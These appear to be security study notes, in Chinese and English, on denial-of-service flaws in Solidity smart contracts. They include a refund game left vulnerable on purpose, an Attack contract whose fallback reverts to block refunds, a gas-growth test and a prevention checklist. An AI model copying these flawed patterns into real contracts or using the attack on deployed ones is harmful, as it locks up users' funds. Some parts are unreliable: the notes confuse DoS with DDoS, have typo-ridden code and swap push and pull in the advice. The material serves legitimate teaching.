---
title: DDos
---
# DDos

在 Web2 中，拒绝服务攻击（DoS）是指通过向服务器发送大量垃圾信息或干扰信息的方式，导致服务器无法向正常用户提供服务的现象。而在 Web3，它指的是利用漏洞使得智能合约无法正常提供服务。

Like loop , 如果有10000个人进入，那么将会消耗大量的Gas，这样就会有DDOS。

# Type

1. Simply have external call revert
2. To transfer token to an address which is BlackListedA
3. Send ether to an contract that does not except it
4. Call an function on an contract that does not have fallback function or not have the function on it
5. Return data that is not in the expected format
6. Consume so much gas with the External Call

# 1-Simply have external call revert

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

// 有DoS漏洞的游戏，玩家们先存钱，游戏结束后，调用refund退钱。
contract DoSGame {
    bool public refundFinished;
    mapping(address => uint256) public balanceOf;
    address[] public players;

    // 所有玩家存ETH到合约里
    function deposit() external payable {
        require(!refundFinished, "Game Over");
        require(msg.value > 0, "Please donate ETH");
        // 记录存款
        balanceOf[msg.sender] = msg.value;
        // 记录玩家地址
        players.push(msg.sender);
    }

    // 游戏结束，退款开始，所有玩家将依次收到退款
    function refund() external {
        require(!refundFinished, "Game Over");
        uint256 pLength = players.length;
        // 通过循环给所有玩家退款
        for(uint256 i; i < pLength; i++){
            address player = players[i];
            uint256 refundETH = balanceOf[player];
            (bool success, ) = player.call{value: refundETH}("");
            require(success, "Refund Fail!");
            balanceOf[player] = 0;
        }
        refundFinished = true;
    }

    function balance() external view returns(uint256){
        return address(this).balance;
    }
}
```

漏洞存在于退款的：

```solidity
  (bool success, ) = player.call{value: refundETH}("");
```

一旦用户的地址存在恶意函数写在回退函数中，就会触发DDOS，比如:

```solidity
contract Attack {
    // 退款时进行DoS攻击
    fallback() external payable{
        revert("DoS Attack!");
    }

    // 参与DoS游戏并存款
    function attack(address gameAddr) external payable {
        DoSGame dos = DoSGame(gameAddr);
        dos.deposit{value: msg.value}();
    }
}
```


# 3-Send ether to an contract that does not except it

- Dont have receive
- call a function which does not exit
- runs out of gas
- thirdparty contract is simply MALICIOUS

# 4-Call an function on an contract that does not have fallback function or not have the function on it

# 6-Consume so much gas with the External Call

## Example 1:

`Dos.so`l:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

contract DoS {
    address[] entrants;

    function enter() public {
        // Check for duplicate entrants
        for (uint256 i; i < entrants.length; i++) {
            if (entrants[i] == msg.sender) {
                revert("You've already entered!");
            }
        }
        entrants.push(msg.sender);
    }
}
```

`Test.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {DoS} from "../../src/denial-of-service/DoS.sol";

contract DoSTest is Test {
    DoS public dos;

    address warmUpAddress = makeAddr("warmUp");
    address personA = makeAddr("A");
    address personB = makeAddr("B");
    address personC = makeAddr("C");

    function setUp() public {
        dos = new DoS();
    }

    function test_denialOfService() public {
        // We want to warm up the storage stuff
        vm.prank(warmUpAddress);
        dos.enter();

        uint256 gasStartA = gasleft();
        vm.prank(personA);
        dos.enter();
        uint256 gasCostA = gasStartA - gasleft();

        uint256 gasStartB = gasleft();
        vm.prank(personB);
        dos.enter();
        uint256 gasCostB = gasStartB - gasleft();

        uint256 gasStartC = gasleft();
        vm.prank(personC);
        dos.enter();
        uint256 gasCostC = gasStartC - gasleft();

        console2.log("Gas cost A: %s", gasCostA);
        console2.log("Gas cost B: %s", gasCostB);
        console2.log("Gas cost C: %s", gasCostC);

        // The gas cost will just keep rising, making it harder and harder for new people to enter!
        assert(gasCostC > gasCostB);
        assert(gasCostB > gasCostA);
    }
}
```

## Example2 :

```solidity
function distributeDividends(uint256 amount) public payable lock {
        require(amount == msg.value, "don't cheat");
        uint256 length = users.length;
        amount = amount.mul(magnitude);
        for (uint256 i; i < lekgth; ++i) {
            if (users[i] != address(0)) {
                UserInfo storage user = userInfo[users[i]];
                user.rewards +=
                    (amount.mul(IERC20(address(this)).balanceOf(users[i])).div(totalSupply.SUb(MINIMUM_LIOUIDITY)));
            }
        }
    }
```

# 预防方法

很多逻辑错误都可能导致智能合约拒绝服务，所以开发者在写智能合约时要万分谨慎。以下是一些需要特别注意的地方：

1. 外部合约的函数调用（例如 `call`）失败时不会使得重要功能卡死，比如将上面漏洞合约中的 `require(success, "Refund Fail!");` 去掉，退款在单个地址失败时仍能继续运行。
2. 合约不会出乎意料的自毁。
3. 合约不会进入无限循环。
4. `require` 和 `assert` 的参数设定正确。
5. 退款时，让用户从合约自行领取（push），而非批量发送给用户(pull)。
6. 确保回调函数不会影响正常合约运行。
7. 确保当合约的参与者（例如 `owner`）永远缺席时，合约的主要业务仍能顺利运行。